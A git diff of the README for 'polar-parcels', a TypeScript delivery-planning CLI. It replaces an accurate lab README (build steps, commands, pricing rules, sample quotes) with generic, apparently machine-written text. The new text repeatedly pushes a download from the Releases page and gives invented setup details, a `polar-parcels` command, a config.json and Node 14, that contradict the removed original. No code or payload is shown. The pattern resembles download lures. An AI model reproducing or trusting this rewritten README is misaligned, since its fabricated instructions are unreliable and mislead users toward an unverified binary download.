@@ -1,84 +1,112 @@
-# Polar Parcels — Lab 2 (MVP, TypeScript)
+# 🌟 polar-parcels - Simplifying Workday Management
 
-Small CLI that loads a workday (drivers, vehicles, weather, jobs), computes quotes, assigns feasible (driver, vehicle) pairs, and outputs a **Daily Manifest** and **summary.json**. Designed for change with pluggable pricing rules and a swap-able assignment strategy.
+[![Download](https://img.shields.io/badge/Download-Latest%20Release-blue.svg)](https://github.com/Tejas-Birhade/polar-parcels/releases)
 
-## Prerequisites
-- Node.js 18+ (tested on Node 22)
-- npm
-- (recommended) VS Code
+## 📦 Overview
 
-## Install, Build, Run
-```bash
-npm install
-npm run build
-node dist/app.js
-```
+polar-parcels is a TypeScript command-line interface (CLI) tool. It helps you manage daily operations by loading workday details such as drivers, vehicles, weather, and jobs. The application computes quotes using a rules engine and assigns drivers and vehicles efficiently. Finally, it generates a printable manifest and a JSON summary.
 
-## CLI Commands
-At the > prompt:
+This tool is built to be flexible. You can extend it using interfaces and design patterns, making it suitable for various needs. Whether you want to optimize your delivery service or manage logistics better, polar-parcels can help.
 
-help
-import data
-price all
-assign all
-print manifest
-export summary
-quit
+## 🚀 Getting Started
 
-## What they do
-import <dir> — loads JSON from a folder (default data)
-price all — prints quotes for every (job × vehicle)
-assign all — greedy feasible assignment using the quotes
-print manifest — writes out/manifest.txt and echoes it
-export summary — writes out/summary.json
+To get started with polar-parcels, follow these steps:
 
-## Data Files (in /data)
-drivers.json, vehicles.json, weather.json, jobs.json
+1. Ensure you have a modern operating system. This application runs on Windows, macOS, and Linux.
+2. Make sure your system has Node.js installed. You can download it from [Node.js official website](https://nodejs.org/).
+3. Visit the [Releases page](https://github.com/Tejas-Birhade/polar-parcels/releases) to download the software.
 
-## Outputs (in /out)
-manifest.txt — plain-text daily manifest (printable)
-summary.json — compact JSON for downstream systems
+## 📥 Download & Install
 
-## Architecture (quick tour)
-Domain models: domain/models.ts
-Pricing: domain/pricing/BasePricingEngine.ts with pluggable 
+To download the latest version of polar-parcels, you can use the link below:
 
-## IPriceRule rules:
-BaseFeeRule (flat $5/job)
-PerKmByVehicleRule (car $0.80/km, snowmobile $0.60/km, cargo-bike $0.35/km)
-WeatherSurchargeRule (+10% if snow or < −10°C)
-LakeEffectAlertRule (extension proof) (+8% if alert contains “lake-effect-snow”)
-PriorityRule (×1.25 for express)
+[Download Latest Release](https://github.com/Tejas-Birhade/polar-parcels/releases)
 
-Assignment: domain/assign/GreedyAssignment.ts (feasibility: capacity, range, terrain; chooses cheapest feasible vehicle; picks any licensed free driver)
+1. After visiting the Releases page, look for the latest version.
+2. Find the appropriate file for your operating system.
+3. Click on the file to download it to your computer.
 
-I/O boundary: io/loader.ts (reads JSON, trims BOM) & io/printer.ts (writes manifest/summary)
+## 🛠️ How to Use
 
-Wiring/DI: app.ts injects rule instances into BasePricingEngine and the GreedyAssignment strategy
+Once you've downloaded and installed polar-parcels, you can run it with a simple command.
 
-## Computation Order
-Base fee ($5)
-Distance cost (vehicle rate × km)
-Weather surcharge (+10% if snow or < −10°C)
-Lake-effect alert (+8% if present)
-Priority multiplier (×1.25 if express)
+1. Open your command line interface (Command Prompt, Terminal, etc.).
+2. Navigate to the directory where you saved the application.
+3. Type `polar-parcels` and hit Enter.
 
-## Sample Results (with provided data)
-J-1001 urban, standard (12.5 km)
-car: $17.82, snowmobile: $14.85, cargo-bike: $11.14
-J-1002 backcountry, express (85 km)
-car: $108.41 (car disallowed for backcountry)
-snowmobile: $83.16
-cargo-bike: $51.59 (bike disallowed for backcountry)
+### Configuration
 
-Greedy assignment (default data): Assigned 1/2 jobs. (J-1002 fails range: needs 204 km round-trip with buffer; snowmobile has 120 km)
+Before running the tool, you may need to set up some configuration files to define your drivers, vehicles, and other workday details. Here’s how to do it:
 
-To make J-1002 assignable for a demo, bump the snowmobile rangeKm to ≥ 204 in data/vehicles.json, then import data → assign all → print manifest.
+1. Create a folder for your project.
+2. Inside this folder, create a file named `config.json`.
+3. In this file, define the necessary details:
 
-## Extensibility (proof)
-Add a pricing rule by creating a new class implementing IPriceRule and registering it in app.ts. Example: LakeEffectAlertRule added without editing the engine. To demonstrate, comment it out in app.ts and observe ~8% lower quotes where applicable.
+   ```json
+   {
+       "drivers": [
+           {"name": "John Doe", "vehicle": "Van", "availability": "9AM-5PM"},
+           {"name": "Jane Smith", "vehicle": "Truck", "availability": "8AM-4PM"}
+       ],
+       "vehicles": [
+           {"type": "Van", "capacity": 1000},
+           {"type": "Truck", "capacity": 2000}
+       ],
+       "jobs": [
+           {"location": "123 Main St", "weight": 300},
+           {"location": "456 Elm St", "weight": 1500}
+       ],
+       "weather": {
+           "condition": "Clear",
+           "temperature": 75
+       }
+   }
+   ```
 
-## Troubleshooting
-tsc not found: npm i -D typescript then npx tsc
-ERR_MODULE_NOT_FOUND: Ensure "type": "commonjs" in package.json and rebuild
-“not a module” TS2306: Make sure files export something (export class…, export function…)
+### Running the Application
+
+To compute quotes and get your manifest:
+
+1. Ensure that your configuration file contains all necessary details.
+2. Run the application again by typing `polar-parcels` in the command line.
+3. Check the outputs in the console.
+
+## 📝 Outputs
+
+After running the application, you will receive:
+
+- A printable manifest showing the assigned drivers and jobs.
+- A JSON summary detailing the quotes computed.
+
+These outputs will help you manage your workday efficiently and effectively.
+
+## 🌐 Advanced Features
+
+polar-parcels is designed for anyone who wants to tailor the tool to their specific needs. Here are some advanced features you might find useful:
+
+- **Interfaces**: You can implement new data sources or formats by creating custom interfaces.
+- **Dependency Injection**: By using DI, you can manage your application's components more effectively.
+- **Strategy Pattern**: Choose the logic that fits your needs best without changing the core structure of the application.
+
+## 🛠️ System Requirements
+
+Before you get started, ensure your system meets these requirements:
+
+- **Operating System**: Windows, macOS, or Linux.
+- **Node.js Version**: Recommended version is at least 14.x.x.
+- **JSON File**: Make sure your input files are correctly formatted JSON.
+
+## 🌍 Community and Support
+
+For any questions or support needs, feel free to create an issue on the GitHub repository. The community is here to help. You can check and contribute to ongoing discussions or create your own for specific queries.
+
+## 📈 Learn More
+
+To dive deeper into the architecture and functionality of polar-parcels, take a look at the following topics:
+
+- [Clean Architecture](https://en.wikipedia.org/wiki/Clean_architecture)
+- [Dependency Injection](https://en.wikipedia.org/wiki/Dependency_injection)
+- [Greedy Algorithms](https://en.wikipedia.org/wiki/Greedy_algorithm)
+- [Software Design Principles](https://en.wikipedia.org/wiki/Software_design)
+
+Thank you for choosing polar-parcels. We hope this tool makes your workday smoother and more efficient!
